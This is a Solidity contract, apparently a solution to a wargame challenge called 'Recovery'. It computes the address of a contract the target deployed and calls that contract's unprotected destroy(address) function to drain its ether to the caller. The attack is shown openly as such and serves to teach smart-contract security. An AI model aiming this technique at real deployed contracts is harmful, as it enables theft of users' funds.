// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IRecovery.sol";

contract RecoveryAttack {
    function attack(IRecovery target) external {
        address lostContractAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(uint8(214), uint8(148), target, uint8(1)))))
        );

        require(0 < lostContractAddress.balance, "Recovery: Wrong balance");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = lostContractAddress.call(abi.encodeWithSignature("destroy(address)", msg.sender));

        require(isSuccess && 0 == lostContractAddress.balance, "Recovery: Attack failed");
    }
}
